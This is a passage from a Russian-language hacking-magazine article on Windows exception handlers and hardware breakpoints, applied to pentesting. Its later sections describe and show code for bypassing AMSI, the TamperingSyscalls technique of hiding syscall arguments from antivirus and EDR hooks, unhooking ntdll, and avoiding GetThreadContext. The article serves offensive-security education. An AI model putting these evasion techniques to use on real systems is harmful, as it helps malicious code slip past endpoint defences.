   перей ти к пре дыдущему блоку try, которому соответству ет блок except,
   и обработать этот блок. То есть система игно рирует текущий обработчик
   исклю чений и пытается найти обра бот чик исклю чений в охватывающем
   блоке (или блоках);
 • EXCEPTION_CONTINUE_EXECUTION — обнаружив такое значение, сис-
   тема воз вращает ся к инструкции, выз вавшей исключение, и пытается
   выполнить ее снова.

Ни же — при мер EXCEPTION_CONTINUE_EXECUTION.


#include <iostream>
#include <cstddef>
#include <Windows.h>


char g_szBuffer[100];


LONG Filter(char** ppchBuffer) {
 if (*ppchBuffer == NULL) {
  *ppchBuffer = g_szBuffer;
  return(EXCEPTION_CONTINUE_EXECUTION);
 }
 return(EXCEPTION_EXECUTE_HANDLER);
}


int main() {
 int x = 0;
 char* pchBuffer = NULL;
 __try {
  *pchBuffer = 'J';
  x = 5 / x;
 }
 __except (Filter(&pchBuffer)) {
  MessageBox(NULL, L"An exception occurred", NULL, MB_OK);
 }
 MessageBox(NULL, L"Function completed", NULL, MB_OK);
 return 0;
}





             При мер EXCEPTION_CONTINUE_EXECUTION

Программы могут быть сложные, страш ные, боль шие, нужно предус матри-
вать корректный выход из всех бло ков, изу чать воз можные исключения. Вдруг
пот ребуется функция уведомления пользователя о сработавшем исклю-
чении? В общем, SEH хорош, но, помимо него, появился и VEH. VEH можно
считать эдакой надстрой кой над SEH. Работает она, само собой, только
в Windows.
   Если в программе воз никает исклю чение, то первыми вызываются именно
векторные обра бот чики и лишь затем сис тема нач нет разворачивать стек.
С помощью VEH прога  может,  например,  зарегис трировать функцию
для прос мотра или обработки всех исклю чений при ложе ния. Причем в прог-
рамму можно добавить несколько VEH-обработчиков, и они будут вызваны
в том поряд ке, в котором были добавлены. Первый — первым, второй — вто-
рым и так далее. SEH пос ле VEH вызывается толь ко в том случае, если VEH
вернул EXCEPTION_CONTINUE_SEARCH.
  С помощью VEH можно ловить исключения, возника ющие при хардверных
брейках.   Добавить   обра ботчик   можно   с   помощью   функции
AddVectoredExceptionHandler().


PVOID AddVectoredExceptionHandler(
 ULONG FirstHandler,
 PVECTORED_EXCEPTION_HANDLER VectoredHandler)

 • FirstHandler — вызывать обработчик раньше всех ранее зарегистри-
   рованных обработчиков (значение CALL_FIRST) или после всех (значение
  CALL_LAST);
 • VectoredHandler — адрес функции обра ботчика. Эта фун кция должна
   возвращать  EXCEPTION_CONTINUE_EXECUTION.  Обработчики  далее
   не выполняют ся, обработка средс тва ми SEH не произво дится, управление
   передается в ту точку прог раммы, из которой было выз вано исключение
   или EXCEPTION_CONTINUE_SEARCH (выполняется следующий векторный
   обработ чик, а если таких нет, то разворачивается SEH).

Зарегистри руем обработчик и проверим работу VEH. Исключением пока
будет стандар тный Null-Pointer Reference. То есть обращение к указате-
лю, который име ет значение nullptr.


#include <iostream>
#include <windows.h>
#include <errhandlingapi.h>


LONG WINAPI MyVectoredExceptionHandler(PEXCEPTION_POINTERS
exceptionInfo)
{
 std::cout << "Exception occurred!" << std::endl;
 std::cout << "Exception Code: " << exceptionInfo->ExceptionRecord->
ExceptionCode << std::endl;
 std::cout << "Exception Address: " << exceptionInfo->ExceptionRecord
->ExceptionAddress << std::endl;


 return EXCEPTION_CONTINUE_SEARCH;
}


int main()
{
 if (AddVectoredExceptionHandler(1, MyVectoredExceptionHandler) ==
nullptr)
 {
  std::cout << "Failed to add the exception handler!" << std::endl;
  return 1;
 }


 int* p = nullptr;
 *p = 42; // Исключение возникает тут


 return 0;
}





             Обработка исклю чения с помощью VEH

Видим, что обработ чик успешно сра баты вает и вызывается, затем возвра-
щает EXCEPTION_CONTINUE_SEARCH. Это, в свою очередь, дергает SEH, SEH
в программе нет, поэтому Visual Studio вклю чает ся и выда ет нам исключение.
Если будем возвращать EXCEPTION_CONTINUE_EXECTION, то получим бес-
конечный вызов обра ботчика, так как каждый раз будет срабаты вать строка
*p = 42.





                 Бесконеч ная обра бот ка исключения

Точ но такое же исклю чение будет сра баты вать и при хар двер ных бряках.
  Наконец, пос ледний тип обра ботчиков — Unhandled Exception Filter. Он
редко  когда используется, но изна чально задумы вался  как обработчик
для исклю чений, которые вооб ще никто не обрабаты вает. Ни VEH (если
отсутс твует или вернул EXCEPTION_CONTINUE_SEARCH), ни SEH (если тоже
отсутс твует или  указано EXCEPTION_CONTINUE_SEARCH).  Устанавливаются
такие обработчики через функцию SetUnhandledExceptionFilter().


LPTOP_LEVEL_EXCEPTION_FILTER SetUnhandledExceptionFilter(
  [in] LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter
);

Фун кция принимает один-единс твенный параметр — адрес функции-обра-
бот чика, которая должна вызываться при возникно вении необ работанного
исклю чения. С помощью UEF  также ловятся исключения, возникающие
при бряках.
   Возьмем прошлый код и переделаем его под UEF.


#include <iostream>
#include <windows.h>


LONG WINAPI MyUnhandledExceptionHandler(PEXCEPTION_POINTERS
exceptionInfo)
{
 std::cout << "Unhandled exception occurred!" << std::endl;


 std::cout << "Exception Code: " << exceptionInfo->ExceptionRecord->
ExceptionCode << std::endl;
 std::cout << "Exception Address: " << exceptionInfo->ExceptionRecord
->ExceptionAddress << std::endl;


 return EXCEPTION_CONTINUE_SEARCH;
}


int main()
{
 if (SetUnhandledExceptionFilter(MyUnhandledExceptionHandler) ==
nullptr)
 {
  std::cout << "Failed to set the unhandled exception filter!" << std
::endl;
  return 1;
 }


 int* p = nullptr;
 *p = 42;


 return 0;
}

Об рати вни мание, что если ты запустишь этот код в Visual Studio, то она
выдаст ошиб ку до UEF.





               Исключение от «Студии», а не от UEF

Это связано с тем, что исключение в дан ном слу чае обрабаты вает Visual
Studio. Если же файл будет запущен за пре делами IDE, то мы получим
успешный вызов обработчика.





                    Вы зов обра бот чика




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




          ИСПОЛЬЗУЕМ ХАРДВЕРНЫЕ БРЕЙК-ПОЙНТЫ
                       В ПЕНТЕСТЕРСКИХ ЦЕЛЯХ





ÓÑÒÀÍÎÂÊÀ HARDWARE BREAKPOINT

Установить HWBP про ще простого — достаточно лишь занести в нужный
регистр адрес. Для боль шей абстракции я написал функцию SetHWBP(), куда
нуж но передать адрес, по которому следует установить точ ку останова,
булево значение (TRUE — уста новить, FALSE — снять), а так же номер регис-
тра. Согласно документации, адрес может быть указан в Dr0, Dr1 и так далее,
но у меня почему-то работа ло только с Dr0.


// address — адрес, по которому ставить функцию
// setBP — FALSE — снять бряк, TRUE — установить
// regnumer — номер регистра, который инициализировать адресом


VOID SetHWBP(LPVOID address, BOOL setBP, int regnumber) {
 // Здесь передаем 0
 CONTEXT context = { 0 };
 context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
 GetThreadContext(GetCurrentThread(), &context);
 // Почему-то бряк, если адрес записывать в регистры, отличные от
Dr0, не срабатывает
 std::string registerNames[] = { "Dr0", "Dr1", "Dr2", "Dr3" };
 if (setBP) {
  DWORD64* registers[] = { &context.Dr0, &context.Dr1, &context.Dr2,
&context.Dr3 };
  if (regnumber >= 0 && regnumber < 4) {
   *registers[regnumber] = (DWORD64)address;
   std::cout << "Writing Address to " << registerNames[regnumber] <<
std::endl;
  }
  else {
   std::wcout << L"Invalid Registry Number" << std::endl;
   exit(-1);
  }
  // Установка бита 0 в DR7 для активации DR0
  context.Dr7 |= 1;
  // Установка битов 16–17 в DR7 для типа точки останова (Execute)
  context.Dr7 |= (0b00 << 16);
  // Установка битов 18–19 в DR7 для длины точки останова (1 byte)
  context.Dr7 |= (0b00 << 18);
 }
 else {
  context.Dr0 = 0;
  context.Dr1 = 0;
  context.Dr2 = 0;
  context.Dr3 = 0;
  context.Dr7 &= ~(1 << 0);
 }


 context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
 SetThreadContext(GetCurrentThread(), &context);
}

Для получе ния значения регистров текуще го потока используется функция
GetThreadContext(), а для уста новки измененных зна чений используется
SetThreadContext().
  Причем, если мы хотим обрабатывать толь ко исключения, сработавшие
из-за HWBP, в нашей функции-обра ботчике следует пре дусмотреть проверку
на наличие в структуре EXCEPTION_POINTERS элемента ExceptionCode, рав-
ного STATUS_SINGLE_STEP. Это значение свидетель ству ет о том, что воз-
никло событие, когда одна инс трукция завершается и сле дующая инс трукция
готова к выполнению.


LONG WINAPI Handler(PEXCEPTION_POINTERS exceptionInfo)
{
 if (exceptionInfo->ExceptionRecord->ExceptionCode ==
STATUS_SINGLE_STEP) {
  std::cout << "Unhandled exception occurred!" << std::endl;


   // Проверка, что реально наш бряк сработал
  if (exceptionInfo->ContextRecord->Dr0 == exceptionInfo->
ContextRecord->Rip || exceptionInfo->ContextRecord->Dr1 ==
exceptionInfo->ContextRecord->Rip || exceptionInfo->ContextRecord->
Dr2 == exceptionInfo->ContextRecord->Rip || exceptionInfo->
ContextRecord->Dr3 == exceptionInfo->ContextRecord->Rip) {
   std::cout << "[-] Breakpoint triggered 0x" << std::hex <<
exceptionInfo->ExceptionRecord->ExceptionAddress << std::endl;
   std::cout << "[!] Exception Code 0x" << std::hex << exceptionInfo
->ExceptionRecord->ExceptionCode << std::endl;
   std::cout << "[!] RIP 0x" << std::hex << exceptionInfo->
ContextRecord->Rip << std::endl;
   std::cout << "[!] RAX 0x" << std::hex << exceptionInfo->
ContextRecord->Rax << std::endl;
   std::cout << "[!] RCX 0x" << std::hex << exceptionInfo->
ContextRecord->Rcx << std::endl;
   std::cout << "[!] RDX 0x" << std::hex << exceptionInfo->
ContextRecord->Rdx << std::endl;
  }


  exceptionInfo->ContextRecord->EFlags |= (1 << 16);
  return EXCEPTION_CONTINUE_EXECUTION;


 }
 // Вернем EXCEPTION_CONTINUE_SEARCH, чтобы передать исключение
дальше
 return EXCEPTION_CONTINUE_SEARCH;
 }

Ис поль зовать в своей прог рамме этот код проще простого. Вот при мер.


#include <iostream>
#include <windows.h>


LONG WINAPI Handler(PEXCEPTION_POINTERS exceptionInfo)
{
 if (exceptionInfo->ExceptionRecord->ExceptionCode ==
STATUS_SINGLE_STEP) {
  std::cout << "Unhandled exception occurred!" << std::endl;


  // Проверка того, что наш бряк реально сработал
  if (exceptionInfo->ContextRecord->Dr0 == exceptionInfo->
ContextRecord->Rip || exceptionInfo->ContextRecord->Dr1 ==
exceptionInfo->ContextRecord->Rip || exceptionInfo->ContextRecord->
Dr2 == exceptionInfo->ContextRecord->Rip || exceptionInfo->
ContextRecord->Dr3 == exceptionInfo->ContextRecord->Rip) {
   std::cout << "[-] Breakppint triggered " << std::hex <<
exceptionInfo->ExceptionRecord->ExceptionAddress << std::endl;
   std::cout << "[!] Exception Code " << std::hex << exceptionInfo->
ExceptionRecord->ExceptionCode << std::endl;
   std::cout << "[!] RIP " << std::hex << exceptionInfo->
ContextRecord->Rip << std::endl;
   std::cout << "[!] RAX " << std::hex << exceptionInfo->
ContextRecord->Rax << std::endl;
   std::cout << "[!] RCX " << std::hex << exceptionInfo->
ContextRecord->Rcx << std::endl;
   std::cout << "[!] RDX " << std::hex << exceptionInfo->
ContextRecord->Rdx << std::endl;
   std::cout << "[!] R8 " << std::hex << exceptionInfo->ContextRecord
->R8 << std::endl;
   std::cout << "[!] R9 " << std::hex << exceptionInfo->ContextRecord
->R9 << std::endl;
   std::cout << "[!] RSP " << std::hex << exceptionInfo->
ContextRecord->Rsp << std::endl;
   std::cout << "[!] Dr0 " << std::hex << exceptionInfo->
ContextRecord->Dr0 << std::endl;
  }


  exceptionInfo->ContextRecord->EFlags |= (1 << 16);
  return EXCEPTION_CONTINUE_EXECUTION;


 }
 // Вернем EXCEPTION_CONTINUE_SEARCH, чтобы передать исключение
дальше
 return EXCEPTION_CONTINUE_SEARCH;
}


VOID SetHWBP(LPVOID address, BOOL setBP, int regnumber) {
 CONTEXT context = { 0 };
 context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
 GetThreadContext(GetCurrentThread(), &context);
 // Почему-то бряк, если адрес записывать в регистры, отличные от
Dr0, не срабатывает
 std::string registerNames[] = { "Dr0", "Dr1", "Dr2", "Dr3" };
 if (setBP) {
  DWORD64* registers[] = { &context.Dr0, &context.Dr1, &context.Dr2,
&context.Dr3 };
  if (regnumber >= 0 && regnumber < 4) {
   *registers[regnumber] = (DWORD64)address;
   std::cout << "Writing Address to " << registerNames[regnumber] <<
std::endl;
  }
  else {
   std::wcout << L"Invalid Registry Number" << std::endl;
   exit(-1);
  }
  // Установка бита 1 в DR7 для активации DR0
  context.Dr7 |= 1;
  // Установка битов 16–17 в DR7 для типа точки останова (Execute)
  context.Dr7 |= (0b00 << 16);
  // Установка битов 18–19 в DR7 для длины точки останова (1 byte)
  context.Dr7 |= (0b00 << 18);
 }
 else {
  context.Dr0 = 0;
  context.Dr1 = 0;
  context.Dr2 = 0;
  context.Dr3 = 0;
  context.Dr7 &= ~(1 << 0);
 }


 context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
 SetThreadContext(GetCurrentThread(), &context);
}
int main()
{


 if (AddVectoredExceptionHandler(1, Handler) == nullptr)
 {
  std::cout << "Failed to set the vectored exception filter!" << std:
:endl;
  return 1;
 }
 // Адрес функции printf
 void* targetAddress = (void*)printf;
 SetHWBP(targetAddress, TRUE, 0);


 // Генерация сигнала точки останова
 printf("Hello, world!");


 return 0;
}

Здесь был уста новлен HWBP по адресу функции printf(). Как только сис-
тема дош ла до вызова этой функции, сработа ло исклю чение, выз вался обра-
бот чик исклю чений, вывел содержимое регистров, а затем вернул управле-
ние на функцию, что при вело к появлению в кон соли Hello, world!.





                      Сработавший HWBP

Те перь мы научились ставить бряки. Как же их исполь зовать для пентестер-
ских целей?


ÎÁÕÎÄ AMSI

У AMSI есть функция AmsiScanBuffer(), которая служит для ска нирования
буфера на предмет наличия зловредов. Ничто нам не меша ет поставить
HWBP на эту функцию, перехватить поток управления и зас тавить фун кцию
вернуть AMSI_RESULT_CLEAN. Этот метод уже давно известен, и код лежит
на GitHub.
  Причем, если нам не подходит реализация на C++, есть на C#, проект
называется SharpBlock. Он патчит AMSI и ETW, используя хардверные
брейк-пойнты. Для этого вынесен отдельный метод EnableBreakpoint().





                       Отдельный метод

Об рати внимание, что в зависи мос ти от архитек туры используются разные
методы. Если у нас х86, то адрес следует кон вертировать с помощью метода
<addr>.ToInt32(), а когда в х64, то <addr>.ToInt64().





                 Функция EnableBreakpoint для х86





                 Функция EnableBreakpoint для х64




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




          ИСПОЛЬЗУЕМ ХАРДВЕРНЫЕ БРЕЙК-ПОЙНТЫ
                       В ПЕНТЕСТЕРСКИХ ЦЕЛЯХ





ÈÇÂËÅ×ÅÍÈÅ ÍÎÌÅÐÎÂ ÑÈÑÊÎËÎÂ

Сисколы позволя ют напрямую обратиться к ядру опе рационной системы, что
поможет избежать хуков в user mode. Подробно сис колы я рассматривал
в матери але «Врата ада. Переписываем Hell’s Gate и обходим антивирус».
Сей час же предлагаю обратить внимание на проект TamperingSyscalls. Этот
про ект использует UEF для извле чения номеров сисколов. Сначала просто
ста вится функция-обра бот чик.


SetUnhandledExceptionFilter( OneShotHardwareBreakpointHandler );

Следом идет поиск адреса Nt* функции и уста новка бряка на адрес syscall
этой функции. Для это го точка оста нова ставится непосредственно на саму
инструкцию.  Адрес  инструкции  находится  стандар тным  ска нированием
памяти на паттерны (а именно на последователь ность бай тов 0f05).


LPVOID FindSyscallAddress( LPVOID function )
{
 BYTE stub[] = { 0x0F, 0x05 };
 for( unsigned int i = 0; i < (unsigned int)25; i++ )
 {
  if( memcmp( (LPVOID)((DWORD_PTR)function + i), stub, 2 ) == 0 ) {
   return (LPVOID)((DWORD_PTR)function + i);
  }
 }
 return NULL;
}

Когда адрес найден, на него устанавлива ется хардверный брейк-пойнт
с помощью сле дующей функции:


VOID SetOneshotHardwareBreakpoint( LPVOID address )
{
 CONTEXT context = { 0 };
 context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
 GetThreadContext( GetCurrentThread(), &context );


 context.Dr0 = (DWORD64)address;
 context.Dr6 = 0;
 context.Dr7 = (context.Dr7 & ~(((1 << 2) - 1) << 16)) | (0 << 16);
 context.Dr7 = (context.Dr7 & ~(((1 << 2) - 1) << 18)) | (0 << 18);
 context.Dr7 = (context.Dr7 & ~(((1 << 1) - 1) << 0)) | (1 << 0);


 context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
 SetThreadContext( GetCurrentThread(), &context );


 return;
}

Нап ример, если мы хотим засисколить фун кцию NtMapViewOfSection(), то
сна чала генерируем нужный код с помощью файла gen.py.


python gen.py NtMapViewOfSection

Это  при ведет   к  созданию  трех  файлов:  TamperingSyscalls.cpp,
TamperingSyscalls.h и main.cpp. Вклю чаем фай лы в проект, после чего
под клю чаем заголовоч ный.


#include "TamperingSyscalls.h"

И вызываем нужные функции, прос то добавляя p к имени.


pNtMapViewOfSection( section, NtCurrentProcess(), &addr, 0, 0, NULL,
&size, 1, 0, PAGE_READONLY );

Внутри    сгенерированной    функции    идет    получе ние    адреса
NtMapViewOfSection() из ntdll.dll.


NTSTATUS pNtMapViewOfSection( HANDLE SectionHandle, HANDLE
ProcessHandle, PVOID BaseAddress, ULONG ZeroBits, SIZE_T CommitSize,
PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD
InheritDisposition, ULONG AllocationType, ULONG Win32Protect ) {
 LPVOID FunctionAddress;
 NTSTATUS status;
 hash( NtMapViewOfSection );
 FunctionAddress = GetProcAddrExH( hashNtMapViewOfSection, hashNTDLL
); typeNtMapViewOfSection fNtMapViewOfSection;


 pNtMapViewOfSectionArgs.SectionHandle = SectionHandle;
 pNtMapViewOfSectionArgs.ProcessHandle = ProcessHandle;
 pNtMapViewOfSectionArgs.BaseAddress = BaseAddress;
 pNtMapViewOfSectionArgs.ZeroBits = ZeroBits;
 pNtMapViewOfSectionArgs.CommitSize = CommitSize;
 pNtMapViewOfSectionArgs.SectionOffset = SectionOffset;
 pNtMapViewOfSectionArgs.ViewSize = ViewSize;
 pNtMapViewOfSectionArgs.InheritDisposition = InheritDisposition;
 pNtMapViewOfSectionArgs.AllocationType = AllocationType;
 pNtMapViewOfSectionArgs.Win32Protect = Win32Protect;
 fNtMapViewOfSection = (typeNtMapViewOfSection)FunctionAddress;


 EnumState = NTMAPVIEWOFSECTION_ENUM;


 SetOneshotHardwareBreakpoint( FindSyscallAddress( FunctionAddress )
);
 status = fNtMapViewOfSection( NULL, NULL, NULL, NULL,
pNtMapViewOfSectionArgs.CommitSize, pNtMapViewOfSectionArgs.
SectionOffset, pNtMapViewOfSectionArgs.ViewSize,
pNtMapViewOfSectionArgs.InheritDisposition, pNtMapViewOfSectionArgs.
AllocationType, pNtMapViewOfSectionArgs.Win32Protect );
 return status;
}

Для получения адре са используется техника API Hashing, которую я демонс-
трировал в статье «Веселые хеши. Реали зуем технику API Hashing, чтобы
обдурить анти вирус». Хеш считается с помощью одно именного макроса.


#define hash( VAL ) constexpr auto CONCAT( hash, VAL ) = HASHALGO(
TOKENIZE( VAL ) );

Далее инициализиру ются все эле менты струк туры NtMapViewOfSectionArgs:


typedef struct {
 HANDLE      SectionHandle;
 HANDLE      ProcessHandle;
 PVOID       BaseAddress;
 ULONG       ZeroBits;
 SIZE_T      CommitSize;
 PLARGE_INTEGER    SectionOffset;
 PSIZE_T     ViewSize;
 DWORD  InheritDisposition;
 ULONG       AllocationType;
 ULONG       Win32Protect;
} NtMapViewOfSectionArgs;

Эта  струк тура  содержит  информа цию  обо  всех  аргу ментах  функции
NtMapViewOfSection, которые будут при меняться в дальнейшем.
  Затем  устанав ливается специальное значение EnumState, благодаря
которому отладчик смо жет понять, бряк на какую фун кцию сработал. Наконец,
про исхо дит непос редствен но вызов Nt-функции, адрес которой был получен
ранее.


status = fNtMapViewOfSection( NULL, NULL, NULL, NULL,
pNtMapViewOfSectionArgs.CommitSize, pNtMapViewOfSectionArgs.
SectionOffset, pNtMapViewOfSectionArgs.ViewSize,
pNtMapViewOfSectionArgs.InheritDisposition, pNtMapViewOfSectionArgs.
AllocationType, pNtMapViewOfSectionArgs.Win32Protect );

Об рати внимание, что первыми четырь мя парамет рами мы передаем NULL.
Именно эти параметры, ско рее всего, будет анализировать анти вирус
до выполнения инструк ции syscall. Но мы на их место передаем NULL, что
сби вает антивирус с толку: он не может при нять решение, легитимный
это вызов или нет, в результате чего про пускает вызов. Фактически таким
образом мы обош ли потенциальный хук.





                  Зачем нуж ны NULL-параметры

Восста новление парамет ров про исхо дит как раз таки в функции-обработ чике
HWBP.


LONG WINAPI OneShotHardwareBreakpointHandler( PEXCEPTION_POINTERS
ExceptionInfo )
{
 if( ExceptionInfo->ExceptionRecord->ExceptionCode ==
STATUS_SINGLE_STEP )
 {
  if( ExceptionInfo->ContextRecord->Dr7 & 1 ) {
   // If the ExceptionInfo->ContextRecord->Rip == ExceptionInfo->
ContextRecord->Dr0
   // Then we are at the one shot breakpoint address
   // ExceptionInfo->ContextRecord->Rax should hold the syscall
number
   PRINT( "Syscall : 0x%x\n", ExceptionInfo->ContextRecord->Rax );
   if( ExceptionInfo->ContextRecord->Rip == ExceptionInfo->
ContextRecord->Dr0 ) {
 ExceptionInfo->ContextRecord->Dr0 = 0;


 // You need to fix your arguments in the right registers and stack
here
 switch( EnumState ) {
  // RCX moved into R10!!! Kudos to @anthonyprintup for catching this
 case NTMAPVIEWOFSECTION_ENUM:
  ExceptionInfo->ContextRecord->R10 =
   (DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].
arguments))->SectionHandle;


  ExceptionInfo->ContextRecord->Rdx =
   (DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].
arguments))->ProcessHandle;


  ExceptionInfo->ContextRecord->R8 =
   (DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].
arguments))->BaseAddress;


  ExceptionInfo->ContextRecord->R9 =
   (DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].
arguments))->ZeroBits;


  break;


 case NTUNMAPVIEWOFSECTION_ENUM:
  ExceptionInfo->ContextRecord->R10 =
   (DWORD_PTR)((NtUnmapViewOfSectionArgs*)(StateArray[EnumState].
arguments))->ProcessHandle;


  ExceptionInfo->ContextRecord->Rdx =
   (DWORD_PTR)((NtUnmapViewOfSectionArgs*)(StateArray[EnumState].
arguments))->BaseAddress;


  break;


 case NTOPENSECTION_ENUM:
  ExceptionInfo->ContextRecord->R10 =
   (DWORD_PTR)((NtOpenSectionArgs*)(StateArray[EnumState].arguments))
->SectionHandle;


  ExceptionInfo->ContextRecord->Rdx =
   (DWORD_PTR)((NtOpenSectionArgs*)(StateArray[EnumState].arguments))
->DesiredAccess;


  ExceptionInfo->ContextRecord->R8 =
   (DWORD_PTR)((NtOpenSectionArgs*)(StateArray[EnumState].arguments))
->ObjectAttributes;


  break;


  // You have messed up by not providing the indexed state
 default:
  ExceptionInfo->ContextRecord->Rip += 1; // Just so we don’t hang
  break;
 }
 return EXCEPTION_CONTINUE_EXECUTION;
   }
  }
 }
 return EXCEPTION_CONTINUE_SEARCH;
}

Сна чала эта фун кция проверяет, что исключение дей ствительно хардверное.
Для этого происходит сравнение со зна чением STATUS_SINGLE_STEP, об этой
про верке я рассказывал выше.
  Далее система про веряет, что хардвер ный брейк-пойнт был вклю чен (дол-
жно быть значение 1 у Dp7). Следующим шагом из регистра Rax извле кается
номер сискола, который был туда занесен. Пос ле чего проверя ем, что адрес
следующей выполняемой инструкции (syscall) дей ствительно лежит в Dp0,
то есть установленный на нее бряк действительно сработал. После чего
HWBP сни мается и начинается провер ка зна чения EnumState, которое ини-
циализировали ранее. Это нуж но для корректной ини циализации всех
парамет ров функции. Если все прош ло успешно, сра баты вает бряк, а за
ним — EXCEPTION_CONTINUE_EXECUTION, что приводит к выполнению сискола
с нужными нам параметрами. Фактически мы «пробрасываем параметры»
в обход EDR.
  Похожая техника при меняется и в HWSyscalls, есть даже отдель ный
шелл-код-лоадер.


ÀÍÕÓÊÈÍÃ

Хардвер ные бряки — очень полезная шту ка! Их можно использовать и для
сня тия хуков в юзермоде. Для этого нужно пред варительно создать дочерний
про цесс, став для него дебаггером. Пос ле это го установить HWBP на фун-
кцию LdrLoadDll(). Эта функция вызывается при загрузке DLL в процесс,
на ее основе я написал собственную LoadLibrary() — подробнее в статье
«Мол чи и скры вай ся. Прячем IAT от антивиру са».
  Далее оста ется лишь проверять име на загружаемых DLL, разрешая под-
грузку только ntdll.dll. Убедив шись, что отлаживаемый процесс загрузил
ntdll.dll, мы копиру ем ее содержимое в свой собственный процесс
и перезаписы ваем ntdll.dll нашего текущего процес са, что и при водит
к анхукин гу. Техника называ ется BlindSide, сущес тву ет готовый PoC.





                       Алгоритм снятия хуков


ÏÈØÅÌ ÊÀÑÒÎÌÍÛÉ GETTHREADCONTEXT()

Мне кажется, мы недостаточно хорошо прош лись по параметрам, которые
при лета ют в функцию-обработчик. Что ж, исправляюсь. Функция-обработчик
при нимает струк туру CONTEXT, содер жащую информацию о зна чении всех
регистров потока. Но проб лема в том, что регистры х64 отличаются от регис-
тров х86, поэто му есть также структура WOW64_CONTEXT, где хранятся зна-
чения регистров у программ для x86.
  Мы можем использовать эти данные для получения структуры CONTEXT,
чтобы избе жать подозрительной функции GetThreadContext(). Вот при мер
кода.


#include <iostream>
#include <Windows.h>


#ifdef _WIN64
void ShowContext(CONTEXT ctx) {
 std::cout << "Context values:" << std::endl;
 std::cout << "P1Home: " << ctx.P1Home << std::endl;
 std::cout << "P2Home: " << ctx.P2Home << std::endl;
 std::cout << "P3Home: " << ctx.P3Home << std::endl;
 std::cout << "P4Home: " << ctx.P4Home << std::endl;
 std::cout << "P5Home: " << ctx.P5Home << std::endl;
 std::cout << "P6Home: " << ctx.P6Home << std::endl;
 std::cout << "ContextFlags: " << ctx.ContextFlags << std::endl;
 std::cout << "MxCsr: " << ctx.MxCsr << std::endl;
 std::cout << "SegCs: " << ctx.SegCs << std::endl;
 std::cout << "SegDs: " << ctx.SegDs << std::endl;
 std::cout << "SegEs: " << ctx.SegEs << std::endl;
 std::cout << "SegFs: " << ctx.SegFs << std::endl;
 std::cout << "SegGs: " << ctx.SegGs << std::endl;
 std::cout << "SegSs: " << ctx.SegSs << std::endl;
 std::cout << "EFlags: " << ctx.EFlags << std::endl;
 std::cout << "Dr0: " << ctx.Dr0 << std::endl;
 std::cout << "Dr1: " << ctx.Dr1 << std::endl;
 std::cout << "Dr2: " << ctx.Dr2 << std::endl;
 std::cout << "Dr3: " << ctx.Dr3 << std::endl;
 std::cout << "Dr6: " << ctx.Dr6 << std::endl;
 std::cout << "Dr7: " << ctx.Dr7 << std::endl;
 std::cout << "Rax: " << ctx.Rax << std::endl;
 std::cout << "Rcx: " << ctx.Rcx << std::endl;
 std::cout << "Rdx: " << ctx.Rdx << std::endl;
 std::cout << "Rbx: " << ctx.Rbx << std::endl;
 std::cout << "Rsp: " << ctx.Rsp << std::endl;
 std::cout << "Rbp: " << ctx.Rbp << std::endl;
 std::cout << "Rsi: " << ctx.Rsi << std::endl;
 std::cout << "Rdi: " << ctx.Rdi << std::endl;
 std::cout << "R8: " << ctx.R8 << std::endl;
 std::cout << "R9: " << ctx.R9 << std::endl;
 std::cout << "R10: " << ctx.R10 << std::endl;
 std::cout << "R11: " << ctx.R11 << std::endl;
 std::cout << "R12: " << ctx.R12 << std::endl;
 std::cout << "R13: " << ctx.R13 << std::endl;
 std::cout << "R14: " << ctx.R14 << std::endl;
 std::cout << "R15: " << ctx.R15 << std::endl;
 std::cout << "Rip: " << ctx.Rip << std::endl;
}
#endif
void ShowContext32(CONTEXT ctx) {
 std::cout << "Context values:" << std::endl;
 std::cout << "ContextFlags: " << ctx.ContextFlags << std::endl;
 std::cout << "Dr0: " << ctx.Dr0 << std::endl;
 std::cout << "Dr1: " << ctx.Dr1 << std::endl;
 std::cout << "Dr2: " << ctx.Dr2 << std::endl;
 std::cout << "Dr3: " << ctx.Dr3 << std::endl;
 std::cout << "Dr6: " << ctx.Dr6 << std::endl;
 std::cout << "Dr7: " << ctx.Dr7 << std::endl;
 std::cout << "SegGs: " << ctx.SegGs << std::endl;
 std::cout << "SegFs: " << ctx.SegFs << std::endl;
 std::cout << "SegEs: " << ctx.SegEs << std::endl;
 std::cout << "SegDs: " << ctx.SegDs << std::endl;
 std::cout << "Edi: " << ctx.Edi << std::endl;
 std::cout << "Esi: " << ctx.Esi << std::endl;
 std::cout << "Ebx: " << ctx.Ebx << std::endl;
 std::cout << "Edx: " << ctx.Edx << std::endl;
 std::cout << "Ecx: " << ctx.Ecx << std::endl;
 std::cout << "Eax: " << ctx.Eax << std::endl;
 std::cout << "Ebp: " << ctx.Ebp << std::endl;
 std::cout << "Eip: " << ctx.Eip << std::endl;
 std::cout << "SegCs: " << ctx.SegCs << std::endl;
 std::cout << "EFlags: " << ctx.EFlags << std::endl;
 std::cout << "Esp: " << ctx.Esp << std::endl;
 std::cout << "SegSs: " << ctx.SegSs << std::endl;
}


LONG WINAPI Handler(PEXCEPTION_POINTERS ExceptionInfo) {
 std::cout << "[+] GetThreadContext Result:" << std::endl;
 static int value = 0;
 value += 1;
#ifdef _WIN64
 PCONTEXT ctx = ExceptionInfo->ContextRecord;
 ShowContext(*ctx);
#else
 PCONTEXT ctx = ExceptionInfo->ContextRecord;
 ShowContext32(*ctx);
#endif


 if (value == 2) {
  value = 0;
  return EXCEPTION_CONTINUE_SEARCH;
 }
 else {
  return EXCEPTION_CONTINUE_EXECUTION;
 }
}


void CustomGetThreadContext() {
 AddVectoredExceptionHandler(1, Handler);


 try {
  throw "exception";
 }
 catch (...) {
  RemoveVectoredExceptionHandler(Handler);
  return;
 }
}


int main() {
 CustomGetThreadContext();
 return 0;
}


